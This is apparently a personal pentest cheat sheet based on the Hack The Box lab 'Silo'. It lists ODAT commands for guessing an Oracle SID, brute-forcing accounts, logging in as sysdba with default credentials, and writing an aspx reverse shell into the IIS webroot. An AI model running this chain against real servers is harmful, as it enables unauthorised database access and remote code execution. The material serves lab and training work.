# Oracle
----------

## ODAT

Refer HTB Silo


Enumerating Oracle DB on port 1521:
Bruteforce SID:
```bash
./odat.py sidguesser -s 10.10.10.82 -p 1521
[+] 'XE' is a valid SID.
```

Once we have a valid SID, we can brute force user accounts.
Wordlist is very important here.
Copy the default metasploit wordlist into  /opt/odat/accounts .
```bash
./odat.py passwordguesser -s 10.10.10.82 -d XE

Valid credentials found: scott/tiger.
```

Once we have creds we can log in using sqlplus:
```bash
sqlplus64 scott/tiger@10.10.10.82:1521/XE
```

Log in with sudo privileges:
```bash
sqlplus64 scott/tiger@10.10.10.82:1521/XE 'as sysdba'
```

If we have write privileges, we can try uploading a file and accessing it from a webserver:
```bash
./odat.py utlfile -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --putFile C:\\inetpub\\wwwroot cbbn.txt cbbn.txt
```

Upload a aspx revershell :
```bash
/odat.py utlfile -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --putFile C:\\inetpub\\wwwroot revshell.aspx revshell.aspx
```